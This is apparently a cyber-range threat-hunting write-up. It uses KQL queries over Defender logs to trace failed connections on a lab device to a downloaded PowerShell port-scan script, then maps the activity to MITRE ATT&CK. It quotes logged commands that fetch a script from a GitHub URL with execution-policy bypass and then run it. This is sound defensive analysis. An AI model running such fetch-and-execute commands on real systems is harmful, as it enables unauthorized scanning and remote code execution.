@@ -1,0 +1,71 @@
+The device `khanglab` was found with multiple "ConnectionFailed" actions
+```kql
+DeviceNetworkEvents
+| order by TimeGenerated desc
+| where DeviceName == "khanglab"
+| where ActionType == "ConnectionFailed"
+| summarize ConnectionCount = count() by DeviceName, ActionType, RemoteIP, LocalIP
+| order by ConnectionCount
+```
+
+Taking a closer look at the IP in question `10.0.0.103`, it appears to be doing a port scan which is causing the multiple failed attempts
+
+```kql
+let IPinQuestion = "10.0.0.103";
+DeviceNetworkEvents
+| order by TimeGenerated desc
+| where ActionType == "ConnectionFailed"
+| where LocalIP == IPinQuestion
+| project TimeGenerated, ActionType, DeviceName, LocalIP, LocalPort, RemoteIP, RemotePort, InitiatingProcessCommandLine
+```
+
+![[Screenshot 2025-10-22 at 8.18.04 PM.png]]
+
+We see that the `InitiatingProcessCommandLine` field shows a PowerShell script being ran called `portscan.ps1`. If we look further down the logs, we would see typical ports being scanned like 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL), 8080 (HTTP), etc.
+
+Next, we look into the `DeviceProcessEvents` table for suspicious activity. The time that we look into is
+```kql
+let VMName = "khanglab";
+let specificTime = datetime(2025-10-22T12:37:33.5976645Z);
+DeviceProcessEvents
+| where TimeGenerated between ( (specificTime - 10m) .. (specificTime + 10m) )
+| where DeviceName == VMName
+| order by TimeGenerated desc
+| project TimeGenerated, FileName, InitiatingProcessCommandLine
+```
+
+![[Screenshot 2025-10-23 at 5.58.19 AM.png]]
+
+We see at `2025-10-22T12:36:57.678805Z` an `Invoke-WebRequest` command is used to download the `portscan.ps1` script from Github.
+```
+"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
+```
+
+In `DeviceFileEvents`, we can see that the file was then created.
+```
+let VMName = "khanglab";
+let specificTime = datetime(2025-10-22T12:37:33.5976645Z);
+DeviceFileEvents
+| where TimeGenerated between ( (specificTime - 10m) .. (specificTime + 10m) )
+| where DeviceName == VMName
+```
+
+
+At `2025-10-22T12:37:01.9554571Z`, the script is executed with this command
+```
+"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
+```
+
+With further investigation, we found the command was run by the SYSTEM account. This was not setup by an admin, so we isolated this device through MDE (Microsoft Defender for Endpoint) and ran a malware scan.
+
+
+## MITRE ATT&CK Framework Related TTPs
+- T1059.001 — PowerShell (Execution)
+- T1204.002 — User Execution: Malicious File
+- T1562.001 — Impair Defenses: Disable or Modify Tools (Execution Policy Bypass)
+- T1027 — Obfuscated Files or Information
+- T1046 — Network Service Scanning
+- T1018 — Remote System Discovery
+- T1071.001 — Application Layer Protocol: Web Protocols (HTTP/S download)
+- T1053.005 — Scheduled Task/Job: Scheduled Task (potential persistence)
+- T1078 — Valid Accounts (script run as SYSTEM)
